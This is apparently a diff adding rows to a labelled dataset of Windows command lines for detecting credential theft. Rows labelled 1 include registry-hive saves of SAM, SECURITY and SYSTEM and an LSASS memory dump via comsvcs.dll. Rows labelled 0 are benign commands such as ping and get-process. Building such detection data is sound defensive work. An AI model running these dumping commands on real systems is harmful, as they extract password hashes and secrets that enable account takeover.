+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+reg query hkcu\console,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+wmic useraccount get name,0
+cmd.exe /c ping 8.8.8.8,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\security c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+cmd.exe /c ping 8.8.8.8,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\sam c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+"cmd.exe /c ""reg save hklm\security c:\temp\sec.dat""",1
+"powershell -nop -c ""reg save hklm\system c:\temp\sam.dat""",1
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+reg query hkcu\console,0
+"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
+wmic useraccount get name,0
+wmic useraccount get name,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sec.dat""",1
+cmd.exe /c ping 8.8.8.8,0
+cmd.exe /c ping 8.8.8.8,0
+wmic useraccount get name,0
+reg query hkcu\console,0
+reg query hkcu\console,0
+"powershell -nop -c ""reg save hklm\security c:\temp\sam.dat""",1
+reg query hkcu\console,0
+cmd.exe /c ping 8.8.8.8,0
+powershell get-process | select-object name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\system c:\temp\sec.dat""",1
+"cmd.exe /c ""reg save hklm\system c:\temp\sam.dat""",1
+"cmd.exe /c ""reg save hklm\sam c:\temp\sam.dat""",1
+reg query hkcu\console,0
+wmic useraccount get name,0
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+powershell get-process | select-object name,0
+"cmd.exe /c ""reg save hklm\sam c:\temp\sec.dat""",1
+wmic useraccount get name,0
